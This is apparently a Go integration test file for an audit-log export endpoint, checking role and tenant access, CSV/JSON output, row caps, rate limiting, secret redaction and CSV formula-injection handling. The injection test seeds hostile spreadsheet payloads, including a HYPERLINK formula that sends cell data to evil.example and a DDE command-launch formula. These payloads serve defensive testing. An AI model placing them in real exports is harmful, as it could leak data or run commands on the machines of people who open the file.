package integration

import (
	"bytes"
	"context"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"testing"
	"time"

	"helios/backend/internal/controlplane/auditlog"
	"helios/backend/internal/platform/ratelimit"
	"helios/backend/internal/server"
)

type exportWorld struct {
	*tenants
}

func newExportWorld(t *testing.T, rules map[string]ratelimit.Rule) *exportWorld {
	t.Helper()
	r := map[string]ratelimit.Rule{ratelimit.ClassAuditExport: {PerSecond: 1000, Burst: 1000}, ratelimit.ClassTokenWrite: {PerSecond: 1000, Burst: 1000}, ratelimit.ClassInvite: {PerSecond: 1000, Burst: 1000}}
	for k, v := range rules {
		r[k] = v
	}
	x := newTenantsWith(t, func(d *server.Deps) { d.Limiter = ratelimit.New(ratelimit.Config{Rules: r}) })
	return &exportWorld{x}
}

func (w *exportWorld) export(u user, env, query string) (int, http.Header, []byte) {
	return w.h.callHdr(u, "GET", "/environments/"+env+"/audit-logs/export"+query, nil)
}

func (w *exportWorld) seed(t *testing.T, env *string, actor, action, resource, before, after string) {
	t.Helper()
	if err := w.h.rawExec(`INSERT INTO audit_logs (workspace_id, environment_id, actor_email, action, resource_type, resource_id, diff_before, diff_after)
		VALUES ($1::uuid, $2::uuid, $3, $4, 'flag', $5, NULLIF($6, '')::jsonb, NULLIF($7, '')::jsonb)`, w.wsA.ID, env, actor, action, resource, before, after); err != nil {
		t.Fatal(err)
	}
}

func parseCSV(t *testing.T, b []byte) [][]string {
	t.Helper()
	recs, err := csv.NewReader(bytes.NewReader(b)).ReadAll()
	if err != nil {
		t.Fatalf("not valid CSV: %v\n%.300s", err, b)
	}
	return recs
}

func TestOnlyAdminsAndOwnersExportAndNeverATokenOrAnotherTenant(t *testing.T) {
	w := newExportWorld(t, nil)
	h := w.h
	ws := w.wsA.ID
	ow := &ownWorld{tenants: w.tenants, clock: &liveClock{}}
	adm := ow.join(t, w.a, ws, "adm", "admin")
	ed := ow.join(t, w.a, ws, "ed", "editor")
	vw := ow.join(t, w.a, ws, "vw", "viewer")
	for name, u := range map[string]user{"owner": w.a, "admin": adm} {
		if st, hdr, b := w.export(u, w.devA, ""); st != 200 || !strings.HasPrefix(hdr.Get("Content-Type"), "text/csv") {
			t.Errorf("%s: %d %.100s", name, st, b)
		}
	}
	for name, u := range map[string]user{"editor": ed, "viewer": vw} {
		if st, _, _ := w.export(u, w.devA, ""); st != 403 {
			t.Errorf("%s exporting: %d, want 403", name, st)
		}
	}
	if st, _, _ := w.export(w.b, w.devA, ""); st != 404 {
		t.Errorf("another tenant: %d, want 404", st)
	}
	if st, _, _ := w.export(user{}, w.devA, ""); st != 401 {
		t.Errorf("signed out: %d", st)
	}
	tok := decode[struct{ Plaintext string }](t, h.expect(201, w.a, "POST", "/workspaces/"+ws+"/api-tokens", map[string]any{"name": "ci", "role": "admin"})).Plaintext
	if st, _, b := h.tokenCall(tok, "GET", "/environments/"+w.devA+"/audit-logs/export", nil); st != 403 || !bytes.Contains(b, []byte("TOKEN_NOT_ALLOWED")) {
		t.Errorf("a token exporting: %d %s", st, b)
	}
}

func TestExportFormatsHeadersRangesAndTheAuditOfTheExport(t *testing.T) {
	w := newExportWorld(t, nil)
	h := w.h
	for i := 0; i < 5; i++ {
		h.expect(200, w.a, "PATCH", "/environments/"+w.devA+"/flags/"+secretFlag, map[string]any{"enabled": i%2 == 1})
	}
	api := decode[struct{ Entries []struct{ ID int64 } }](t, h.expect(200, w.a, "GET", "/environments/"+w.devA+"/audit-logs?limit=200", nil))

	st, hdr, body := w.export(w.a, w.devA, "?format=csv")
	if st != 200 || !strings.Contains(hdr.Get("Content-Disposition"), `attachment; filename="audit-dev-`) || hdr.Get("Cache-Control") != "no-store" || hdr.Get("X-Content-Type-Options") != "nosniff" {
		t.Fatalf("headers: %d %v", st, hdr)
	}
	recs := parseCSV(t, body)
	if strings.Join(recs[0], ",") != "id,createdAt,actorType,actor,action,resourceType,resourceId,severity,scope,diffBefore,diffAfter,actorDetail" {
		t.Errorf("header: %v", recs[0])
	}
	// the same entries the read route shows (the export was written after, so it is not among them)
	if len(recs)-1 != len(api.Entries) {
		t.Errorf("CSV has %d rows, the read route %d entries", len(recs)-1, len(api.Entries))
	}
	st, hdr, body = w.export(w.a, w.devA, "?format=json")
	if st != 200 || !strings.HasPrefix(hdr.Get("Content-Type"), "application/json") {
		t.Fatalf("json: %d %v", st, hdr)
	}
	var rows []map[string]any
	if err := json.Unmarshal(body, &rows); err != nil {
		t.Fatalf("not valid JSON: %v", err)
	}
	if len(rows) < len(api.Entries) || rows[0]["action"] == nil || rows[0]["createdAt"] == nil {
		t.Errorf("json rows: %d", len(rows))
	}
	last := 0.0
	for _, r := range rows {
		if id := r["id"].(float64); id <= last {
			t.Fatalf("rows out of order: %v after %v", id, last)
		} else {
			last = id
		}
	}
	// each export is itself audited
	if n := h.count(`SELECT count(*) FROM audit_logs WHERE workspace_id = $1::uuid AND action = 'audit.export' AND severity = 'critical'`, w.wsA.ID); n != 2 {
		t.Errorf("export audit entries: %d, want 2", n)
	}
	// parameters
	today := time.Now().UTC().Format("2006-01-02")
	for name, q := range map[string]string{
		"more than 90 days": "?from=2025-01-01&to=2025-06-01", "from after to": "?from=2026-02-01&to=2026-01-01", "bad format": "?format=xml", "bad date": "?from=yesterday",
		"repeated": "?format=csv&format=json", "equal": "?from=" + today + "T00:00:00Z&to=" + today + "T00:00:00Z",
	} {
		if st, _, b := w.export(w.a, w.devA, q); st != 400 {
			t.Errorf("%s: %d %.100s, want 400", name, st, b)
		}
	}
	if st, _, _ := w.export(w.a, w.devA, "?from="+today+"&to="+today); st != 200 {
		t.Errorf("a bare date as the end means the whole day: %d", st)
	}
	if st, _, _ := w.export(w.a, w.devA, "?from=2026-01-01&to=2026-03-31"); st != 200 {
		t.Errorf("exactly 89 days: %d", st)
	}
}

func TestExportRowCapAndBoundedBatchesAreHonest(t *testing.T) {
	w := newExportWorld(t, nil)
	for i := 0; i < 40; i++ {
		w.seed(t, nil, "seed@example.com", "flag.update", fmt.Sprintf("seed-%02d", i), "", "")
	}
	// batches of 7: every row once, in order, none twice, none missing
	oldBatch, oldMax := auditlog.ExportBatch, auditlog.MaxExportRows
	defer func() { auditlog.ExportBatch, auditlog.MaxExportRows = oldBatch, oldMax }()
	auditlog.ExportBatch = 7
	_, _, body := w.export(w.a, w.devA, "?format=csv")
	recs := parseCSV(t, body)[1:]
	seen := map[string]bool{}
	var prev int
	for _, r := range recs {
		var id int
		fmt.Sscan(r[0], &id)
		if id <= prev || seen[r[0]] {
			t.Fatalf("row %s repeated or out of order after %d", r[0], prev)
		}
		prev, seen[r[0]] = id, true
	}
	if n := w.h.count(`SELECT count(*) FROM audit_logs WHERE workspace_id = $1::uuid AND (environment_id = $2::uuid OR environment_id IS NULL) AND action <> 'audit.export'`, w.wsA.ID, w.devA); len(recs) < n {
		t.Errorf("only %d of %d rows exported with batches of 7", len(recs), n)
	}
	// over the cap: refused whole, nothing is cut short silently, and no export is recorded
	auditlog.MaxExportRows = 10
	before := w.h.count(`SELECT count(*) FROM audit_logs WHERE action = 'audit.export'`)
	st, _, b := w.export(w.a, w.devA, "")
	if st != 422 || !bytes.Contains(b, []byte("EXPORT_TOO_LARGE")) {
		t.Fatalf("over the cap: %d %s", st, b)
	}
	if w.h.count(`SELECT count(*) FROM audit_logs WHERE action = 'audit.export'`) != before {
		t.Error("a refused export was audited as an export")
	}
	// a narrower range gets through
	auditlog.MaxExportRows = oldMax
	if st, _, _ := w.export(w.a, w.devA, "?from=2020-01-01&to=2020-01-02"); st != 200 {
		t.Errorf("a narrow range: %d", st)
	}
}

func TestExportOnlyHoldsThisEnvironmentsEntriesAndTheWorkspaceWideOnes(t *testing.T) {
	w := newExportWorld(t, nil)
	staging, prod := envID(t, w.wsA, "staging"), envID(t, w.wsA, "production")
	w.seed(t, &w.devA, "x@example.com", "flag.update", "only-dev", "", "")
	w.seed(t, &staging, "x@example.com", "flag.update", "only-staging", "", "")
	w.seed(t, &prod, "x@example.com", "flag.update", "only-production", "", "")
	w.seed(t, nil, "x@example.com", "flag.create", "workspace-wide", "", "")
	// another tenant's entries never appear
	if err := w.h.rawExec(`INSERT INTO audit_logs (workspace_id, actor_email, action, resource_type, resource_id) VALUES ($1::uuid, 'b@example.com', 'flag.create', 'flag', 'bs-private-entry')`, w.wsB.ID); err != nil {
		t.Fatal(err)
	}
	for _, format := range []string{"csv", "json"} {
		_, _, b := w.export(w.a, w.devA, "?format="+format)
		for _, want := range []string{"only-dev", "workspace-wide"} {
			if !bytes.Contains(b, []byte(want)) {
				t.Errorf("%s: missing %s", format, want)
			}
		}
		for _, bad := range []string{"only-staging", "only-production", "bs-private-entry", w.wsB.ID} {
			if bytes.Contains(b, []byte(bad)) {
				t.Errorf("%s: contains %s", format, bad)
			}
		}
	}
	// B exporting its own environment sees none of A's
	_, _, b := w.export(w.b, w.devB, "")
	if bytes.Contains(b, []byte("only-dev")) || bytes.Contains(b, []byte(w.wsA.ID)) {
		t.Error("B's export holds A's entries")
	}
}

func TestCSVInjectionIsNeutralisedAndQuotingSurvivesHostileContent(t *testing.T) {
	w := newExportWorld(t, nil)
	hostile := []string{
		`=HYPERLINK("http://evil.example/?x="&A1,"click")`, `+1+1`, `-2+3`, `@SUM(A1:A9)`, "\t=1+1", "\r=1+1", "\n=1+1",
		`=cmd|' /C calc'!A0`, `"quoted, with comma"`, "line one\nline two", `plain "inner" quotes`, `a,b,c`, `fine`, `',=nested'`, "unicode ☃ é",
	}
	for i, hs := range hostile {
		w.seed(t, nil, hs, "flag.update", fmt.Sprintf("res-%d-%s", i, hs), "", fmt.Sprintf(`{"name":%q}`, hs))
	}
	_, _, b := w.export(w.a, w.devA, "?format=csv")
	recs := parseCSV(t, b)
	got := map[string]bool{}
	for _, r := range recs[1:] {
		for ci, cell := range r {
			if ci == 1 || ci == 0 { // id and timestamp
				continue
			}
			if cell != "" && strings.ContainsAny(cell[:1], "=+-@\t\r\n") {
				t.Errorf("a cell begins with a formula character: %q", cell)
			}
		}
		got[r[3]] = true // the actor column
	}
	for _, hs := range hostile {
		switch hs[0] {
		case '=', '+', '-', '@', '\t', '\r', '\n':
			if !got["'"+hs] {
				t.Errorf("%q was not neutralised to a quoted-apostrophe cell", hs)
			}
		default:
			if !got[hs] {
				t.Errorf("%q did not survive CSV quoting intact", hs)
			}
		}
	}
	// the JSON export is not a spreadsheet: values are exact
	_, _, jb := w.export(w.a, w.devA, "?format=json")
	var rows []struct{ Actor string }
	if err := json.Unmarshal(jb, &rows); err != nil {
		t.Fatal(err)
	}
	found := 0
	for _, r := range rows {
		for _, hs := range hostile {
			if r.Actor == hs {
				found++
			}
		}
	}
	if found != len(hostile) {
		t.Errorf("JSON carries %d of %d hostile values exactly", found, len(hostile))
	}
}

func TestNoSecretLeavesThroughAnExport(t *testing.T) {
	w := newExportWorld(t, nil)
	secrets := []string{
		"hlt_0123abcd_" + strings.Repeat("Q", 43), "whsec_" + strings.Repeat("W", 43), "hinv_" + strings.Repeat("I", 43), "hsdk_0123abcd_" + strings.Repeat("S", 43),
		"abcdef0123456789tokenhashvalue", "Bearer " + strings.Repeat("B", 30), "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTYifQ.signaturepart", "$argon2id$v=19$m=19456,t=2,p=1$abc$def",
		"sealedciphertextvalue123", "hunter2-password",
	}
	diff := fmt.Sprintf(`{"token":%q,"secret":%q,"inviteToken":%q,"sdkKey":%q,"tokenHash":%q,"Authorization":%q,"jwt":%q,"keyHash":%q,"secret_enc":%q,"password":%q,
		"flagKey":"checkout","enabled":true,"nested":{"deeper":[{"plaintext":%q},{"note":"leaked %s in text"}]}}`,
		secrets[0], secrets[1], secrets[2], secrets[3], secrets[4], secrets[5], secrets[6], secrets[7], secrets[8], secrets[9], secrets[0], secrets[1])
	w.seed(t, nil, "ops@example.com", "api_token.create", "tok", diff, diff)
	if err := w.h.rawExec(`INSERT INTO audit_logs (workspace_id, actor_type, actor_email, actor_detail, action, resource_type, resource_id)
		VALUES ($1::uuid, 'api_token', $2, $3::jsonb, 'flag.update', 'flag', $4)`, w.wsA.ID, "name ("+secrets[0]+")", fmt.Sprintf(`{"tokenId":"x","token":%q}`, secrets[0]), "res "+secrets[2]); err != nil {
		t.Fatal(err)
	}
	for _, format := range []string{"csv", "json"} {
		_, _, b := w.export(w.a, w.devA, "?format="+format)
		for _, s := range secrets {
			if bytes.Contains(b, []byte(s)) {
				t.Errorf("%s export contains %q", format, s[:min(len(s), 24)])
			}
		}
		for _, keep := range []string{"checkout", "[REDACTED]"} {
			if !bytes.Contains(b, []byte(keep)) {
				t.Errorf("%s export lost %q (the scrubber removed too much, or nothing)", format, keep)
			}
		}
	}
}

func TestExportIsRateLimited(t *testing.T) {
	w := newExportWorld(t, map[string]ratelimit.Rule{ratelimit.ClassAuditExport: {PerSecond: 0.001, Burst: 2}})
	for i := 0; i < 2; i++ {
		if st, _, _ := w.export(w.a, w.devA, ""); st != 200 {
			t.Fatalf("export %d: %d", i, st)
		}
	}
	st, hdr, b := w.export(w.a, w.devA, "")
	if st != 429 || hdr.Get("Retry-After") == "" || !bytes.Contains(b, []byte("RATE_LIMITED")) {
		t.Errorf("third export: %d %s", st, b)
	}
	// a refused export is not audited as an export
	if n := w.h.count(`SELECT count(*) FROM audit_logs WHERE action = 'audit.export'`); n != 2 {
		t.Errorf("export audit entries: %d", n)
	}
	_ = io.Discard
	_ = context.Background
}
